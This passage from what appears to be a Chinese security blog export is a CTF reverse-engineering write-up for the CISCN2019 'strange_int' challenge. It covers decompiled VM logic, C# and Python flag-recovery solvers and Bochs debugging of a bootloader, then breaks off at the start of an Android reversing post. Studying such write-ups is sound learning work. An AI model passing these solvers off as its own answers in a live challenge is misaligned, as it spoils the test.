code[buf[0]] # ('Read code, offset:', '129')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '129')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '130')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '130')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '131')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '131')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '132')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '132')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '133')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '133')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '134')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '134')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '135')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '135')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '136')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '136')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '137')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '137')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[0] = 129buf[1] = buf[0]buf[2] = 9buf[1] += buf[2]buf[3] = code[buf[0]] # ('Read code, offset:', '129')buf[4] = code[buf[1]] # ('Read code, offset:', '138')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126print 'wrong' 上面是在 buf[3] != 0 的时候，输出 wrong 的情况，如果在这个条件判断中都正确的话，会产生以下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122buf[0] = 129buf[1] = buf[0]buf[2] = 9buf[1] += buf[2]buf[3] = code[buf[0]] # ('Read code, offset:', '129')buf[4] = code[buf[1]] # ('Read code, offset:', '138')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '130')buf[4] = code[buf[1]] # ('Read code, offset:', '139')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '131')buf[4] = code[buf[1]] # ('Read code, offset:', '140')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '132')buf[4] = code[buf[1]] # ('Read code, offset:', '141')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '133')buf[4] = code[buf[1]] # ('Read code, offset:', '142')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '134')buf[4] = code[buf[1]] # ('Read code, offset:', '143')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '135')buf[4] = code[buf[1]] # ('Read code, offset:', '144')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '136')buf[4] = code[buf[1]] # ('Read code, offset:', '145')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '137')buf[4] = code[buf[1]] # ('Read code, offset:', '146')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90print 'right' 人脑逆向机简化一波代码，就是一个 9 次的循环异或，并在最后进行比较： 1234567891011i = 129while True: code[i] = code[i] ^ (code[i] &lt;&lt; 8) ^ (code[i] &lt;&lt; 16) ^ (code[i] &lt;&lt; 24) ^ code[i - 1] ^ (code[i - 1] &lt;&lt; 8) ^ (code[i - 1] &lt;&lt; 16) ^ (code[i - 1] &lt;&lt; 24) i += 1 if i - 138 == 0: breakfor i in range(9): if code[138 + i] - code[129 + i] != 0: print 'wrong' exit()print 'right' 这里已知正确的数据在计算后的结果，可以通过爆破来得到（爆破范围比较大，Python 会消耗很多时间，这里用 C#）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546using System;namespace Solve &#123; class Program &#123; public static byte[] intToBytes(uint value) &#123; byte[] res = new byte[4]; res[3] = (byte) ((value &gt;&gt; 24) &amp; 0xFF); res[2] = (byte) ((value &gt;&gt; 16) &amp; 0xFF); res[1] = (byte) ((value &gt;&gt; 8) &amp; 0xFF); res[0] = (byte) (value &amp; 0xFF); return res; &#125; public static string asciiToString(byte[] array) &#123; return Convert.ToString(System.Text.Encoding.ASCII.GetString(array)); &#125; static void Main(string[] args) &#123; var data = new uint[] &#123; 0x61646238, 0x36353465, 0x6361352d, 0x31312d38, 0x612d3965, 0x2d316331, 0x39653838, 0x30386566, 0x66616566, 0x57635565, 0x06530401, 0x1f494949, 0x5157071f, 0x575f4357, 0x57435e57, 0x4357020a, 0x575e035e, 0x0f590000, 0x6e6f7277, 0x20202067, 0x00202020, 0x72726f63, 0x20746365, 0x20202020, 0x6c660020, 0x69206761, 0x6c662073, 0x597b6761, 0x5072756f, 0x68637461, 0x2020207d, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0xffffff00, 0xffffffff &#125;; var ans = new uint[data.Length]; var patch = new byte[data.Length * 4]; for(uint i = 0; i &lt; 9; i++) &#123; uint t = 0; for(uint j = 0; j &lt;= 0x7FFFFFFF; j++) &#123; t = j ^ (j &lt;&lt; 8) ^ (j &lt;&lt; 16) ^ (j &lt;&lt; 24); if(i &gt; 0) &#123; t ^= ans[i - 1] ^ (ans[i - 1] &lt;&lt; 8) ^ (ans[i - 1] &lt;&lt; 16) ^ (ans[i - 1] &lt;&lt; 24); &#125; if(t == data[i + 9]) &#123; // 0x57635565 ans[i] = j; patch[4 * i] = intToBytes(j)[0]; patch[4 * i + 1] = intToBytes(j)[1]; patch[4 * i + 2] = intToBytes(j)[2]; patch[4 * i + 3] = intToBytes(j)[3]; Console.WriteLine(&quot;0x&#123;0:X8&#125;&quot;, j); break; &#125; &#125; &#125; string flag = asciiToString(patch); Console.WriteLine(flag); &#125; &#125;&#125; 当然在已知数据的情况下也可以直接逆回来： 12345678#!/usr/bin/env pythondata = [0x57635565, 0x06530401, 0x1F494949, 0x5157071F, 0x575F4357, 0x57435E57, 0x4357020A, 0x575E035E, 0x0F590000, 0x00000000]flag = ''for i in range(9): flag += libnum.n2s(data[i] ^ ((data[i] &lt;&lt; 8) &amp; 0xFFFFFFFF))[::-1] data[i + 1] = data[i] ^ data[i + 1]print flag bochs 调试这道题其实主要通过 bochs 进行动态调试来分析，下面附上动态调试的一些过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;bochs:1&gt; b 0x7c00&lt;bochs:2&gt; c00000004662i[BIOS ] $Revision: 13073 $ $Date: 2017-02-16 22:43:52 +0100 (Do, 16. Feb 2017) $00000318050i[KBD ] reset-disable command received00000320819i[BIOS ] Starting rombios3200000321257i[BIOS ] Shutdown flag 000000321840i[BIOS ] ram_size=0x0200000000000322261i[BIOS ] ram_end=32MB00000362829i[BIOS ] Found 1 cpu(s)00000376413i[BIOS ] bios_table_addr: 0x000f9cd8 end=0x000fcc0000000704208i[PCI ] i440FX PMC write to PAM register 59 (TLB Flush)00001032137i[P2ISA ] PCI IRQ routing: PIRQA# set to 0x0b00001032156i[P2ISA ] PCI IRQ routing: PIRQB# set to 0x0900001032175i[P2ISA ] PCI IRQ routing: PIRQC# set to 0x0b00001032194i[P2ISA ] PCI IRQ routing: PIRQD# set to 0x0900001032204i[P2ISA ] write: ELCR2 = 0x0a00001032974i[BIOS ] PIIX3/PIIX4 init: elcr=00 0a00001040697i[BIOS ] PCI: bus=0 devfn=0x00: vendor_id=0x8086 device_id=0x1237 class=0x060000001042976i[BIOS ] PCI: bus=0 devfn=0x08: vendor_id=0x8086 device_id=0x7000 class=0x060100001045094i[BIOS ] PCI: bus=0 devfn=0x09: vendor_id=0x8086 device_id=0x7010 class=0x010100001045323i[PIDE ] new BM-DMA address: 0xc00000001045939i[BIOS ] region 4: 0x0000c00000001047953i[BIOS ] PCI: bus=0 devfn=0x0a: vendor_id=0x8086 device_id=0x7020 class=0x0c0300001048157i[UHCI ] new base address: 0xc02000001048773i[BIOS ] region 4: 0x0000c02000001048901i[UHCI ] new irq line = 900001050796i[BIOS ] PCI: bus=0 devfn=0x0b: vendor_id=0x8086 device_id=0x7113 class=0x068000001051028i[ACPI ] new irq line = 1100001051040i[ACPI ] new irq line = 900001051065i[ACPI ] new PM base address: 0xb00000001051079i[ACPI ] new SM base address: 0xb10000001051107i[PCI ] setting SMRAM control register to 0x4a00001215200i[CPU0 ] Enter to System Management Mode00001215200i[CPU0 ] enter_system_management_mode: temporary disable VMX while in SMM mode00001215210i[CPU0 ] RSM: Resuming from System Management Mode00001379231i[PCI ] setting SMRAM control register to 0x0a00001394138i[BIOS ] MP table addr=0x000f9db0 MPC table addr=0x000f9ce0 size=0xc800001395960i[BIOS ] SMBIOS table addr=0x000f9dc000001398141i[BIOS ] ACPI tables: RSDP addr=0x000f9ee0 ACPI DATA addr=0x01ff0000 size=0xf7200001401353i[BIOS ] Firmware waking vector 0x1ff00cc00001403148i[PCI ] i440FX PMC write to PAM register 59 (TLB Flush)00001403871i[BIOS ] bios_table_cur_addr: 0x000f9f0400001531488i[VBIOS ] VGABios $Id: vgabios.c,v 1.76 2013/02/10 08:07:03 vruppert Exp $00001531559i[BXVGA ] VBE known Display Interface b0c000001531591i[BXVGA ] VBE known Display Interface b0c500001534516i[VBIOS ] VBE Bios $Id: vbe.c,v 1.65 2014/07/08 18:02:25 vruppert Exp $00014040189i[BIOS ] Booting from 0000:7c00(0) Breakpoint 1, 0x0000000000007c00 in ?? ()Next at t=14040244(0) [0x000000007c00] 0000:7c00 (unk. ctxt): jmpf 0x07c0:0005 ; ea0500c007 可以用 show mode 命令来显示实模式向保护模式的转换： 123&lt;bochs:3&gt; show modeshow mode switch: ONshow mask is: mode 利用 u 命令来查看汇编代码，这里是实模式的部分： 12345678910111213141516171819202122232425262728293031323334&lt;bochs:7&gt; u/40 0x7c0000007c00: ( ): jmpf 0x07c0:0005 ; ea0500c00700007c05: ( ): mov ax, cs ; 8cc800007c07: ( ): mov ds, ax ; 8ed800007c09: ( ): mov ss, ax ; 8ed000007c0b: ( ): mov sp, 0x0400 ; bc000400007c0e: ( ): cld ; fc00007c0f: ( ): mov ax, 0x0003 ; b8030000007c12: ( ): int 0x10 ; cd1000007c14: ( ): mov dx, 0x0000 ; ba000000007c17: ( ): mov cx, 0x0002 ; b9020000007c1a: ( ): mov ax, 0x1000 ; b8001000007c1d: ( ): mov es, ax ; 8ec000007c1f: ( ): xor bx, bx ; 31db00007c21: ( ): mov ax, 0x0228 ; b8280200007c24: ( ): int 0x13 ; cd1300007c26: ( ): jnb .+2 ; 730200007c28: ( ): jmp .-2 ; ebfe00007c2a: ( ): cli ; fa00007c2b: ( ): mov ax, 0x1000 ; b8001000007c2e: ( ): mov ds, ax ; 8ed800007c30: ( ): xor ax, ax ; 31c000007c32: ( ): mov es, ax ; 8ec000007c34: ( ): mov cx, 0x2000 ; b9002000007c37: ( ): sub si, si ; 29f600007c39: ( ): sub di, di ; 29ff00007c3b: ( ): rep movsb byte ptr es:[di], byte ptr ds:[si] ; f3a400007c3d: ( ): mov ax, 0x07c0 ; b8c00700007c40: ( ): mov ds, ax ; 8ed800007c42: ( ): lidt ds:0x006f ; 0f011e6f0000007c47: ( ): lgdt ds:0x0075 ; 0f0116750000007c4c: ( ): mov ax, 0x0001 ; b8010000007c4f: ( ): lmsw ax ; 0f01f000007c52: ( ): jmpf 0x0008:0000 ; ea00000800 在指令 lmsw ax 处看到实模式向保护模式的转换： 1234567&lt;bochs:39&gt; nNext at t=15885325(0) [0x000000007c4f] 07c0:004f (unk. ctxt): lmsw ax ; 0f01f0&lt;bochs:40&gt;00015885326: switched from &apos;real mode&apos; to &apos;protected mode&apos;Next at t=15885326(0) [0x000000007c52] 07c0:0000000000000052 (unk. ctxt): jmpf 0x0008:0000 ; ea00000800 保护模式的前一段部分： 12345678910111213&lt;bochs:42&gt; u/20 0x0000000000: ( ): mov eax, 0x00000010 ; b81000000000000005: ( ): mov ds, ax ; 8ed800000007: ( ): lss esp, ds:0x00000b5c ; 0fb2255c0b00000000000e: ( ): call .+120 ; e87800000000000013: ( ): call .+107 ; e86b00000000000018: ( ): mov eax, 0x00000010 ; b8100000000000001d: ( ): mov ds, ax ; 8ed80000001f: ( ): mov es, ax ; 8ec000000021: ( ): mov fs, ax ; 8ee000000023: ( ): mov gs, ax ; 8ee800000025: ( ): lss esp, ds:0x00000b5c ; 0fb2255c0b00000000002c: ( ): xor ebx, ebx ; 31db IDTR 的初始化： 1234567891011121314&lt;bochs:39&gt; u/20 0x8b0000008b: ( ): mov edx, 0x000000fc ; bafc00000000000090: ( ): mov eax, 0x00080000 ; b80000080000000095: ( ): mov ax, dx ; 6689d000000098: ( ): mov dx, 0x8e00 ; 66ba008e0000009c: ( ): lea edi, dword ptr ds:0x00000128 ; 8d3d28010000000000a2: ( ): mov ecx, 0x00000100 ; b900010000000000a7: ( ): mov dword ptr ds:[edi], eax ; 8907000000a9: ( ): mov dword ptr ds:[edi+4], edx ; 895704000000ac: ( ): add edi, 0x00000008 ; 83c708000000af: ( ): dec ecx ; 49000000b0: ( ): jnz .-11 ; 75f5000000b2: ( ): lidt ds:0x0000011c ; 0f011d1c010000000000b9: ( ): ret ; c3 GDTR 的初始化： 123&lt;bochs:68&gt; u/10 0x8300000083: ( ): lgdt ds:0x00000122 ; 0f0115220100000000008a: ( ): ret ; c3 用 sreg 命令可以看到 GDTR 和 IDTR 寄存器被初始化了： 1234567891011121314151617&lt;bochs:75&gt; sreges:0x0000, dh=0x00009300, dl=0x0000ffff, valid=7 Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedcs:0x0008, dh=0x00c09b00, dl=0x000007ff, valid=1 Code segment, base=0x00000000, limit=0x007fffff, Execute/Read, Non-Conforming, Accessed, 32-bitss:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7 Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessedds:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7 Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessedfs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1 Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedgs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1 Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedldtr:0x0000, dh=0x00008200, dl=0x0000ffff, valid=1tr:0x0000, dh=0x00008b00, dl=0x0000ffff, valid=1gdtr:base=0x0000000000000928, limit=0x1fidtr:base=0x0000000000000128, limit=0x7ff 最后是虚拟机指令部分： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;bochs:43&gt; u/110 0xb7c00000b7c: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000b83: ( ): mov dword ptr ds:[ecx], eax ; 890100000b85: ( ): jmp .+366 ; e96e01000000000b8a: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000b91: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000b93: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000b9a: ( ): mov dword ptr ds:[ecx], eax ; 890100000b9c: ( ): jmp .+343 ; e95701000000000ba1: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000ba8: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000baa: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bb1: ( ): lea eax, dword ptr ds:[eax*4+3400] ; 8d0485480d000000000bb8: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000bba: ( ): mov dword ptr ds:[ecx], eax ; 890100000bbc: ( ): jmp .+311 ; e93701000000000bc1: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000bc8: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000bca: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bd1: ( ): mov ecx, dword ptr ds:[ecx] ; 8b0900000bd3: ( ): lea ecx, dword ptr ds:[ecx*4+3400] ; 8d0c8d480d000000000bda: ( ): mov dword ptr ds:[ecx], eax ; 890100000bdc: ( ): jmp .+279 ; e91701000000000be1: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000be8: ( ): mov edx, dword ptr ds:[eax] ; 8b1000000bea: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bf1: ( ): mov eax, dword ptr ds:[ecx] ; 8b0100000bf3: ( ): add eax, edx ; 01d000000bf5: ( ): mov dword ptr ds:[ecx], eax ; 890100000bf7: ( ): jmp .+252 ; e9fc00000000000bfc: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c03: ( ): mov edx, dword ptr ds:[eax] ; 8b1000000c05: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c0c: ( ): mov eax, dword ptr ds:[ecx] ; 8b0100000c0e: ( ): sub eax, edx ; 29d000000c10: ( ): mov dword ptr ds:[ecx], eax ; 890100000c12: ( ): jmp .+225 ; e9e100000000000c17: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c1e: ( ): mov edx, dword ptr ds:[eax] ; 8b1000000c20: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c27: ( ): mov eax, dword ptr ds:[ecx] ; 8b0100000c29: ( ): xor eax, edx ; 31d000000c2b: ( ): mov dword ptr ds:[ecx], eax ; 890100000c2d: ( ): jmp .+198 ; e9c600000000000c32: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c39: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000c3b: ( ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b000000000c42: ( ): mov cl, al ; 88c100000c44: ( ): mov eax, dword ptr ds:[edx] ; 8b0200000c46: ( ): shl eax, cl ; d3e000000c48: ( ): mov dword ptr ds:[edx], eax ; 890200000c4a: ( ): jmp .+169 ; e9a900000000000c4f: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c56: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000c58: ( ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b000000000c5f: ( ): mov cl, al ; 88c100000c61: ( ): mov eax, dword ptr ds:[edx] ; 8b0200000c63: ( ): shr eax, cl ; d3e800000c65: ( ): mov dword ptr ds:[edx], eax ; 890200000c67: ( ): jmp .+140 ; e98c00000000000c6c: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c73: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000c75: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c7c: ( ): mov edx, dword ptr ds:[ecx] ; 8b1100000c7e: ( ): and eax, edx ; 21d000000c80: ( ): mov dword ptr ds:[ecx], eax ; 890100000c82: ( ): jmp .+116 ; eb7400000c84: ( ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000c8b: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000c8d: ( ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000c93: ( ): mov dword ptr ds:[ecx], eax ; 890100000c95: ( ): iret ; cf00000c96: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c9d: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000c9f: ( ): test eax, eax ; 85c000000ca1: ( ): jnz .+85 ; 755500000ca3: ( ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000caa: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000cac: ( ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cb2: ( ): mov dword ptr ds:[ecx], eax ; 890100000cb4: ( ): iret ; cf00000cb5: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000cbc: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000cbe: ( ): test eax, eax ; 85c000000cc0: ( ): jz .+54 ; 743600000cc2: ( ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000cc9: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000ccb: ( ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cd1: ( ): mov dword ptr ds:[ecx], eax ; 890100000cd3: ( ): iret ; cf00000cd4: ( ): lea eax, dword ptr ds:0x00000f94 ; 8d05940f000000000cda: ( ): call .-3061 ; e80bf4ffff00000cdf: ( ): hlt ; f400000ce0: ( ): lea eax, dword ptr ds:0x00000fa0 ; 8d05a00f000000000ce6: ( ): call .-3073 ; e8fff3ffff00000ceb: ( ): lea eax, dword ptr ds:0x00000fae ; 8d05ae0f000000000cf1: ( ): call .-3084 ; e8f4f3ffff00000cf6: ( ): hlt ; f400000cf7: ( ): hlt ; f400000cf8: ( ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cfe: ( ): mov eax, dword ptr ds:[ecx] ; 8b0100000d00: ( ): add eax, 0x00000003 ; 83c00300000d03: ( ): mov dword ptr ds:[ecx], eax ; 890100000d05: ( ): iret ; cf Referenceshttps://www.52pojie.cn/thread-936377-1-1.htmlhttps://blog.csdn.net/ice__snow/article/details/50654629https://blog.51cto.com/4201689/1420063https://www.cnblogs.com/playmak3r/p/12079833.htmlhttps://blog.qrzbing.cn/2019/04/27/CISCN2019-strange-int/http://imushan.com/2018/07/11/os/Bochs%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E7%AF%87/https://www.cnblogs.com/mlzrq/p/10223079.html#%E4%BD%BF%E7%94%A8bochs%E8%B0%83%E8%AF%95https://mrh1s.top/posts/d2cf12e4/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"}]},{"title":"Android逆向入门（一）","slug":"Android逆向入门（一）","date":"2020-01-16T06:41:48.000Z","updated":"2020-02-18T09:11:55.785Z","comments":true,"path":"2020/01/16/Android逆向入门（一）/","link":"","permalink":"blog.b3ale.cn/2020/01/16/Android逆向入门（一）/","excerpt":"开始学习安卓。","text":"开始学习安卓。 APK 的组成 asset 文件夹 资源目录，不需要生成索引，在 Java 代码中需要用 AssetManager 来访问 lib 文件夹 so 库存放位置，一般由 NDK 编译得到，常见于使用游戏引擎或 JNI native 调用的工程中 META-INF 文件夹 存放工程的一些属性文件，例如 